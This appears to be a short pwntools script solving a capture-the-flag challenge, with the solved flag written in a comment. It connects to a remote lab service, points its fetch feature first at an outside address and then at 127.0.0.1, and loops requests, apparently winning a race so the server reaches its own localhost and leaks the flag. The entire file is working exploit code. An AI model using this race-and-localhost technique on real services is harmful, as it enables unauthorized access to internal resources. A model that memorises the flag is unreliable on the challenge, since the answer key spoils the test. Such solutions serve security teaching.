#!/usr/bin/env python3

from pwn import *

# FLAG{U5e_r33ntr@nt_func_w/_c@re!}

URL = "up.zoolab.org"
PORT = 10932

r = remote(URL, PORT)

r.sendline(b"g")
r.sendline(b"up.zoolab.org/10000")

r.sendline(b"g")
r.sendline(b"127.0.0.1/10000")

while True:
    r.sendline(b"v")
    msg = r.recvuntil(b"What do you want to do?").decode()

    print(msg)

    if "FLAG" in msg:
        break

r.interactive()
